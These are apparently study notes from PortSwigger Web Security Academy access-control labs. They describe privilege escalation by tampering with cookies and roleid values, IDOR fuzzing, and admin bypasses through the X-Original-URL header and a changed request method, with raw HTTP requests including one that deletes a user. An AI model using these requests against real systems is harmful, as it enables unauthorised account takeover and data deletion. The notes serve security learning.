### *Simple recon*
- Check `/robots.txt` for any pages that have been disallowed. Then, check the JavaScript of the page to see if an admin page URL is being dynamically generated.

- Find the username of another user, if the account page is `https://vulnerable-website.com?id=username`, you may be able to find a horizontal access control vulnerability by fuzzing for usernames. `https://vulnerable-website.com?id=FUZZ`
### *Query parameters & cookies*
- The admin page is only protected by a cookie, which can be modified to the role of 2. The response sets the cookie `Admin=false`. Change it to `Admin=true`.

- The user is set a `roleid` when signing up, and can be changed when doing an email change function through a POST request. You could fuzz this, then use a python script to go to the admin page, and check for any responses that stand out, in this example, `1` was the default user, and `2` was an administrator.
```
{
	"email":"email@email.com",
	"roleid": 2
}
```

- If there is an account page that is using query parameters with a GUID (Globally Unique Identifier) like `https://vulnerable-website.com/account?id=089ff591-a896-42b2-8915-21e241b56c66`. There may be another link that shows something else related to another user, in this case it is a list of their blog posts `https://vulnerable-website.com/blogs?userId=089ff591-a896-42b2-8915-21e241b56c66`. Now you can use the GUID from that URL to see their account page and access their API key.

- This example has an information disclosure vulnerability that can access the administrator's account simply by editing the query parameter to match the username of the administrator `https://vulnerable-website.com/account?id=administrator`. This gives a response that has the administrator's password in plain text, in the HTML for the password change functionality. This would be an example of horizontal (accessing another user's account) and vertical (gaining access to an administrator account with enhanced functionality).
### *Redirection information disclosure*
Try to access the account page of another user `https://vulnerable-website.com?id=carlos`, there may be a redirection that contains sensitive data, in this case, you can see carlos' API key.
```
HTTP/2 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3655

<!DOCTYPE html>
<html>
    <body>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: carlos</p>
                        <div>Your API Key is: daGNL3eB3I5nz8zcAHffazwhVd7LCJg2</div><br/>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="YUbBIzS609wnOFRwOMOAMvx6SClS8W4J">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```
### *IDOR*
- A live chat feature has an IDOR vulnerability where you can fuzz for transcripts of other users chat's. `https://vulnerable-website.com/download-transcript/FUZZ.txt`
### *Platform misconfiguration*
#### X-Original-URL bypass header
This back-end framework supports the `X-Original-URL:` header. It is an HTTP header that can be used to attempt to bypass security filters by providing an alternative path for the request. It is not inherently supported or recognized by back-end frameworks out of the box; rather, its support or handling depends on how the back-end application is designed to process or respect custom HTTP headers.

In this example, I was able to bypass the access controls by overriding the normal `https://vulnerable-website.com/` request to go to `https://vulnerable-website.com/admin`, as I saw that it gave me an explicit "access denied" when trying to access `/admin` normally through the URL.

I intercepted a normal request to `/` and added: `X-Original-URL: /admin`
```
GET / HTTP/2
X-Original-URL: /admin
Host: vulnerable-website.com
Cookie: session=tc6t3XkQc4ulfujyESL7wK6UKllsrDtt
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```

I was able to bypass the "access denied" error, then I saw I could delete a user, so I deleted the user, intercepted the request and I deleted the `/admin/deleteUser?username=carlos` from the URL, and added it to the request:
```
POST /?username=carlos HTTP/2
X-Original-URL: /admin/deleteUser
Host: vulnerable-website.com
Cookie: session=tc6t3XkQc4ulfujyESL7wK6UKllsrDtt
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```

I added the `?username=carlos` to the normal request URL because I was getting an error saying "username parameter is required" when using `X-Original-URL: /admin/deleteUser?username=carlos`. 
#### *Method based bypass*
I was able to bypass an admin functionality which upgraded my account to admin status. Firstly, fuzz for directories. I found an endpoint `https://vulnerable-website.com/admin-roles`. This functionality upgrades or downgrades users, I was able to bypass a 401 unauthorized by changing the request method from a POST to a PUT. You may also have to fuzz for payloads e.g: `username=wiener&action=upgrade`.
```
PUT /admin-roles HTTP/2
Host: 0a230082033bd7c08069677c00ec0046.web-security-academy.net
Cookie: session=msbvgTE6HRvutTUncqL4pbZhehEgF4LT
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a230082033bd7c08069677c00ec0046.web-security-academy.net/admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a230082033bd7c08069677c00ec0046.web-security-academy.net
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=wiener&action=upgrade
```
### *Resources*
https://portswigger.net/web-security/access-control